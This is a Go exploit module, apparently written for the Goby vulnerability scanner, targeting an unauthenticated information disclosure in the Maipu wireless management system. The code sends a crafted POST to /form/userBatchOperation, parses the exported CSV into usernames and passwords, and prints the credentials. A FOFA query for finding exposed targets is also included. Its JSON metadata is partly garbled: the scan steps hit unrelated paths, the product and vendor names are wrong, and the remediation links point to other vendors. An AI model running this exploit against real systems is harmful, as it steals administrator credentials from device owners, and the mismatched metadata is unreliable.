package exploits

import (
	"encoding/json"
	"errors"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "Maipu wireless management system /form/userBatchOperation Information Disclosure Vulnerability",
    "Description": "<p>Maipu Wireless Management System is a set of efficient and intelligent wireless network management platform independently developed by Maipu Communication Technology Co., LTD. The system supports centralized management and configuration of wireless access points (aps), wireless controllers (acs) and other devices, providing rich service types and powerful management functions. Through Maipu wireless management system, users can easily realize the planning, deployment, monitoring and maintenance of wireless networks to ensure the efficient and stable operation of wireless networks.Information leakage exists at the userBatchOperation interface of McLean wireless management system, which can cause unauthorized attackers to obtain sensitive information.</p>",
    "Product": "Maplexin-Tech-Co.,-Ltd.",
    "Homepage": "https://www.maipu.cn/",
    "DisclosureDate": "2024-10-23",
    "PostTime": "2024-10-25",
    "Author": "3013320359@qq.com",
    "FofaQuery": "(body=\"/switchMlcVersion_login\" && body=\"js/base64.js\") || header=\"Server: Maipu-Webs\"",
    "GobyQuery": "(body=\"/switchMlcVersion_login\" && body=\"js/base64.js\") || header=\"Server: Maipu-Webs\"",
    "Level": "1",
    "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.</p>",
    "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version: <a href=\"http://www.dlink.com.cn/\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p><a href=\"https://www.maipu.cn/\">https://www.maipu.cn/</a></p><p>2. Deploy a web application firewall . </p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/weixin_43167326/article/details/142760168"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "keyinfo",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/de2api/engine/getEngine;.js",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "password",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "迈普无线管理系统 /form/userBatchOperation 信息泄露漏洞",
            "Product": "迈普通信技术股份有限公司",
            "Description": "<p>&nbsp;迈普无线管理系统是迈普通信技术股份有限公司自主研发的一套高效、智能的无线网络管理平台。该系统支持对无线接入点（AP）、无线控制器（AC）等设备的集中管理和配置，提供丰富的业务类型和强大的管理功能。通过迈普无线管理系统，用户可以轻松实现无线网络的规划、部署、监控和维护，确保无线网络的高效、稳定运行 。<br></p><p>迈普无线管理系统userBatchOperation接口处存在信息泄露，可以导致未授权的攻击者获取敏感信息。</p>",
            "Recommendation": "<p>1、关注官方补丁发布信息，打上补丁或者升级到最新版本：<a href=\"https://www.maipu.cn/\">https://www.maipu.cn/</a><a href=\"https://www.dahuatech.com/\"></a></p><p>2、部署Web应用防火墙。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，读取系统敏感信息。</p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "Maipu wireless management system /form/userBatchOperation Information Disclosure Vulnerability",
            "Product": "Maplexin-Tech-Co.,-Ltd.",
            "Description": "<p>Maipu Wireless Management System is a set of efficient and intelligent wireless network management platform independently developed by Maipu Communication Technology Co., LTD. The system supports centralized management and configuration of wireless access points (aps), wireless controllers (acs) and other devices, providing rich service types and powerful management functions. Through Maipu wireless management system, users can easily realize the planning, deployment, monitoring and maintenance of wireless networks to ensure the efficient and stable operation of wireless networks.Information leakage exists at the userBatchOperation interface of McLean wireless management system, which can cause unauthorized attackers to obtain sensitive information.<br></p>",
            "Recommendation": "<p>1. Pay attention to the official patch release information, install the patch or upgrade to the latest version:&nbsp;<a href=\"http://www.dlink.com.cn/\"></a><a href=\"https://www.dahuatech.com/\"></a></p><p><a href=\"https://www.maipu.cn/\">https://www.maipu.cn/</a><br></p><p>2. Deploy a web application firewall .&nbsp;</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>The attacker reads the sensitive information of the system by constructing a special URL address.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`
	//定义的结构体用于后续提取返回中的账号密码
	type User struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}

	postOrGet_ujK9IYLtOW := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		url := `/form/userBatchOperation`
		payload := `searchType=ALL&search=&fileNameHttp=&userCsvFlag=3&btnExportCsv=导出CSV文件`
		header := map[string]string{
			"Content-Type": "application/x-www-form-urlencoded",
		}
		resp, err := setPostRequest(hostInfo, url, payload, header)
		if err != nil || resp == nil || resp.StatusCode != 200 {
			return "", err
		}
		if !strings.Contains(resp.Utf8Html, "admin") {

			return "", errors.New("no information")
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/form/userBatchOperation"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/form/userBatchOperation": "admin",
			}
			// 函数继承
			uploadFileFunc := postOrGet_ujK9IYLtOW

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"keyinfo": {"/form/userBatchOperation", "admin"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_ujK9IYLtOW

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			// cleanString 函数用于清理字符串中的乱码部分并忽略第一个换行符之前的内容
			cleanString := func (input string) string {
				// 找到第一个换行符的位置
				firstNewLineIndex := strings.Index(input, "\n")
				if firstNewLineIndex == -1 {
				return "" // 如果没有换行符，返回空字符串
			}

				// 截取从第一个换行符之后的部分
				remainingString := input[firstNewLineIndex+1:]

				// 这里假设乱码部分是ASCII值小于32的字符，可以根据实际需要调整
				cleaned := strings.Map(func(r rune) rune {
				if r >= 32 || r == '\n' || r == '\t' { // 保留换行符和制表符
				return r
			}
				return -1
			}, remainingString)
				return cleaned
			}
			// 清理字符串，去除乱码部分
			cleanedString := cleanString(resp)

			// 分割字符串为行
			lines := strings.Split(cleanedString, "\n")

			// 创建一个用户切片
			var users []User

			// 解析每一行，创建User对象并添加到切片中
			for _, line := range lines {
				parts := strings.Split(line, ",")
				if len(parts) == 3 {
					user := User{
						Username: parts[0],
						Password: parts[2],
					}
					users = append(users, user)
				}
			}

			// 将用户切片编码为JSON格式
			jsonData, err := json.MarshalIndent(users, "", "  ")
			if err != nil {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = "账号，密码信息：" + string(jsonData)
			return expResult

		},
	))
}
